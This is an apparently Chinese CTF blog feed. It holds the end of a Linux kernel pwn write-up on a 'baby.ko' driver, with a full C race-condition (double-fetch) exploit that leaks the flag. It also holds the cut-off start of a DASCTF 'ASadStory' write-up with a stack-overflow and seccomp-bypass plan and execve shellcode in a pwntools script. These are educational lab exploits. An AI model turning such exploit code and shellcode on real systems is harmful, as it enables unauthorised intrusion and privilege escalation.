variable">-device</span> e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 <span class="token punctuation">\</span><span class="token parameter variable">-nographic</span>  -enable-kvm  <span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸºæœ¬æ²¡å¼€ä»€ä¹ˆä¿æŠ¤</p><h2 id="core-init"><a href="#core-init" class="headerlink" title="&#x2F;core&#x2F;init"></a>&#x2F;core&#x2F;init</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev<span class="token builtin class-name">echo</span> <span class="token string">"flag&#123;this_is_a_sample_flag&#125;"</span> <span class="token operator">></span> flag<span class="token function">chown</span> root:root flag<span class="token function">chmod</span> <span class="token number">400</span> flag<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/consoleinsmod baby.ko<span class="token function">chmod</span> <span class="token number">777</span> /dev/baby<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token function">umount</span> /proc<span class="token function">umount</span> /syspoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span>  <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨&#x2F;dev&#x2F;babyæœ‰ä¸€ä¸ªé©±åŠ¨</p><h2 id="baby-ko"><a href="#baby-ko" class="headerlink" title="baby.ko"></a>baby.ko</h2><p><img src="/Binary_FILE/86c4412a35b01465833c8740c52858c2_MD5.jpeg"></p><h3 id="init-module"><a href="#init-module" class="headerlink" title="init_module"></a>init_module</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">init_module</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">misc_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>baby<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ›å»ºäº†ä¸€ä¸ªé©±åŠ¨baby</p><h3 id="baby-ioctl"><a href="#baby-ioctl" class="headerlink" title="baby_ioctl"></a>baby_ioctl</h3><p><img src="/Binary_FILE/eadf383cf8e6cae625207e66cd8edf2d_MD5.jpeg"><br>ä¸éš¾çœ‹å‡ºæˆ‘ä»¬ä¼ å…¥çš„ç»“æ„ä½“ä¸ºï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">v5</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>flag<span class="token punctuation">;</span><span class="token class-name">size_t</span> len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­å‚æ•°Â <code>0x6666</code>Â å¯ä»¥è·å¾— flag åœ¨å†…æ ¸ä¸­çš„åœ°å€ï¼Œå‚æ•°Â <code>0x1337</code>Â åˆ™ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„ flag ä¸çœŸæ­£çš„ flag è¿›è¡Œå¯¹æ¯”ï¼Œè‹¥æ­£ç¡®åˆ™ä¼šå°† flag æ‰“å°å‡ºæ¥<br><img src="/Binary_FILE/eebcbda8ae5b6b515c20e3017fafb6b5_MD5.jpeg"></p><p>ä¸»è¦çœ‹æ‰“å°flagçš„è¿™ä¸ªæ£€æŸ¥ï¼Œéœ€è¦<code>_chk_range_not_ok()</code>å‡½æ•°è¿”å›å€¼ä¸º0ï¼š<br><img src="/Binary_FILE/59f16cbe8aad4e8fd08af279bdf46247_MD5.jpeg"></p><p>å…¶ä¸­<code>_chk_range_not_ok()</code>å¦‚ä¸‹<br><img src="/Binary_FILE/e097bac6f5c642a14e4b8c5f77a7cb57_MD5.jpeg"></p><ul><li>CFæ˜¯è¿›ä½æ ‡å¿—ï¼Œå¦‚æœè¿ç®—ç»“æœçš„<strong>æœ€é«˜ä½</strong>äº§ç”Ÿäº†ä¸€ä¸ªè¿›ä½æˆ–é”™ä½ï¼Œé‚£ä¹ˆï¼Œå…¶å€¼ä¸º1ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬ä¸€èˆ¬æ»¡è¶³</li><li>a3è¦æ±‚å°äºa1+a2ï¼Œè¿™ä¸ªa3æ˜¯<code>*(__readgsqword(&amp;current_task) + 0x1358)</code>ã€‚åˆ‡rootåŠ¨è°ƒçœ‹ï¼š<br><img src="/Binary_FILE/b805321a5fcf6e3effc02f924b2707f9_MD5.jpeg"><br>å¯è§è¯¥å€¼ä¸º0x7ffffffff000ï¼Œæ­£å¥½æ˜¯ç”¨æˆ·æ€çš„æ ˆåº•å€¼<br><img src="/Binary_FILE/b240eb23c9676449cc306e4f05fd6dfa_MD5.jpeg"></li></ul><p>ç»¼ä¸Šæ‰€è¿°ï¼Œæ£€æŸ¥ä¸ºï¼š</p><ol><li>è¾“å…¥çš„æ•°æ®æŒ‡é’ˆæ˜¯å¦ä¸ºç”¨æˆ·æ€æ•°æ®</li><li>æ•°æ®æŒ‡é’ˆå†…çš„æˆå‘˜flagæŒ‡é’ˆæ˜¯å¦æŒ‡å‘ç”¨æˆ·æ€</li><li>æŒ‡é’ˆæŒ‡å‘æ•°æ®çš„lenæ˜¯å¦å¯¹äºflagé•¿åº¦</li></ol><h2 id="äºŒ-EXP"><a href="#äºŒ-EXP" class="headerlink" title="(äºŒ)EXP"></a>(äºŒ)EXP</h2><p>è¿™ä¸ªé©±åŠ¨ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæ¼æ´ï¼Œä½†æ˜¯å…¶ä¸­çš„ä¸¤ä¸ªæ£€æŸ¥æ˜¯åˆ†å¼€çš„<br><img src="/Binary_FILE/9dd93c0fa6f031532ec84d6e1b89e70b_MD5.jpeg"><br>å¦‚æœæˆ‘ä»¬åœ¨åˆ¤æ–­flagåœ°å€èŒƒå›´å’Œflagå†…å®¹ä¹‹é—´è¿›è¡Œç«äº‰ï¼Œé€šè¿‡ç¬¬ä¸€å¤„æ£€æŸ¥åå°±æŠŠflagçš„åœ°å€æ¢ä¸ºå†…æ ¸ä¸­çœŸæ­£flagçš„åœ°å€ï¼Œç„¶åè‡ªèº«ä¸è‡ªèº«æ¯”è¾ƒï¼Œé€šè¿‡æ£€æŸ¥æ‹¿åˆ°flagã€‚</p><p>æ”»å‡»æ€è·¯ï¼š</p><ol><li>åˆ›å»ºä¸€ä¸ªç«äº‰çº¿ç¨‹ï¼Œä¸æ–­ä¿®æ”¹flag.flag_addrä¸ºå†…æ ¸flagåœ°å€</li><li>å¾ªç¯æ‰§è¡Œioctlï¼ˆäº‹å‰æ”¹flag.flag_addrä¸ºç”¨æˆ·æ€åœ°å€ï¼‰</li></ol><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_sp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span><span class="token string">"mov user_cs,cs;"</span><span class="token string">"mov user_ss,ss;"</span><span class="token string">"mov user_sp,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop user_rflags;"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token punctuation">&#123;</span><span class="token keyword">char</span> <span class="token operator">*</span>flag_addr<span class="token punctuation">;</span><span class="token class-name">size_t</span> flag_len<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>flag<span class="token punctuation">;</span><span class="token keyword">int</span> status<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token class-name">pthread_t</span> compete_thread<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">competitionThread</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span>flag_addr<span class="token operator">=</span>addr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/baby"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to open /dev/baby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag > ./addr.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//get addr</span><span class="token keyword">int</span> addr_fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"./addr.txt"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>addr_fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to open /dev/baby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> real_addr<span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>addr_fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>real_addr<span class="token operator">=</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"ff"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>real_addr<span class="token operator">=</span><span class="token function">strtoul</span><span class="token punctuation">(</span>real_addr<span class="token punctuation">,</span>real_addr<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]real_addr: %p\n"</span><span class="token punctuation">,</span> real_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//competition</span><span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> competitionThread <span class="token punctuation">,</span>real_addr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> try_times<span class="token operator">=</span><span class="token number">0x1000</span><span class="token punctuation">;</span>flag<span class="token punctuation">.</span>flag_len<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>try_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>flag<span class="token punctuation">.</span>flag_addr<span class="token operator">=</span><span class="token string">"X1NRI"</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x1337</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>status<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token function">pthread_cancel</span><span class="token punctuation">(</span>compete_thread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/Binary_FILE/bf3135c1609351382f4aa65ddebf4bc3_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X 0psu3 2023åä¸€æœˆæŒ‘æˆ˜èµ›</title>
      <link href="/2023/12/11/DASCTF%20X%200psu3%202023%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
      <url>/2023/12/11/DASCTF%20X%200psu3%202023%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<p><img src="/EXP_FILE/97aa869f5bad1ebb9f7a850637e5c183_MD5.jpeg"></p><blockquote><p>WPï¼š<a href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">DAS X 0psu3 - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn)</a></p></blockquote><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="ASadStory"><a href="#ASadStory" class="headerlink" title="ASadStory"></a>ASadStory</h2><p>æ²¡canaryï¼Œpartial relro<br><img src="/EXP_FILE/7ef99aa3078903a58b74311db309722c_MD5.jpeg">ã€2.31-0ubuntu9.12ã€‘æ— æ³„éœ²å †æ²™ç›’<br>è¯•è¿è¡Œä¸€ä¸‹ğŸ˜‚<br><img src="/EXP_FILE/0aa0df98f3b91e0b12b185e69f91bd52_MD5.jpeg"></p><h3 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h3><p>ç›´æ¥çœ‹1.yesï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸¤ä¸ªæ­¦å™¨ï¼š<br><img src="/EXP_FILE/105a6c6cb8dcfd465ec799ecc734a962_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __noreturn <span class="token function">sub_1492</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-Ch] BYREF</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK,now I will tell you the name of the betrayers:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"s* &amp;&amp; B*!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your mission is to defeat them!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You can choice a weapon: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"your choice: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v2 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_1420</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v2 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">sub_1468</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>æ­¦å™¨1<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_1420</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> sub_1249<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_2200<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>èƒ½æ³„éœ²pieï¼Œä½†æ˜¯ä¼šå…³é—­æ ‡å‡†è¾“å‡º</li><li>æ­¦å™¨2<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_1468</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> v1<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  <span class="token function">gets</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sanbox</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>ä¸€ä¸ªæ— é™æ ˆæº¢å‡ºï¼Œä¸è¿‡åŒæ—¶ä¼šæ‰“å¼€prctlæ²™ç®±ï¼Œç¦ç”¨äº†execveå’Œopenï¼Œå¹¶é™åˆ¶äº†arch<br><img src="/EXP_FILE/c1fd61751f52ca7e5e88cf79bf28ff2c_MD5.jpeg"></li></ul><blockquote><p>æƒ³è¦ret2libcï¼Œå°±å¿…é¡»æ³„éœ²pieè€Œå…³æ‰è¾“å‡ºï¼Œå¯å…³æ‰è¾“å‡ºå°±æ— æ³•å¾—åˆ°libcåœ°å€ï¼Œå·¦å³ä¸ºéš¾ã€‚</p></blockquote><h3 id="EXP1-æ”¹closeä¸ºsyscall"><a href="#EXP1-æ”¹closeä¸ºsyscall" class="headerlink" title="EXP1-æ”¹closeä¸ºsyscall"></a>EXP1-æ”¹closeä¸ºsyscall</h3><p>æˆ‘ä»¬åœ¨æ— æ³•æ³„éœ²libcçš„æƒ…å†µä¸‹å¦‚ä½•orw?</p><p>æ€è·¯1ï¼šæ”¹closeæœ«ä½å­—èŠ‚ä¸ºsyscallï¼Œåˆ©ç”¨readå‡½æ•°æ§åˆ¶raxå¯„å­˜å™¨è¿›è¡Œç³»ç»Ÿè°ƒç”¨ï¼ŒåŒæ—¶åˆ©ç”¨ret2csuæ§åˆ¶å„å¯„å­˜å™¨ã€‚<br>ç³»ç»Ÿè°ƒç”¨writeæ³„éœ²libcï¼Œæ¥ç€orwå®Œæˆåˆ©ç”¨ï¼ˆä¸ºäº†æ–¹ä¾¿è¿›è¡Œäº†æ ˆåŠ«æŒï¼‰<br><img src="/EXP_FILE/02b968aaa6a44677f73b44c31244dc7d_MD5.jpeg"></p><p>ç¦ç”¨äº†openï¼Ÿç”¨openatä¸å°±è¡Œæ‹‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># !/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span>she_i386_20<span class="token operator">=</span><span class="token string">b"\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span>she_amd64_30<span class="token operator">=</span><span class="token string">b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token 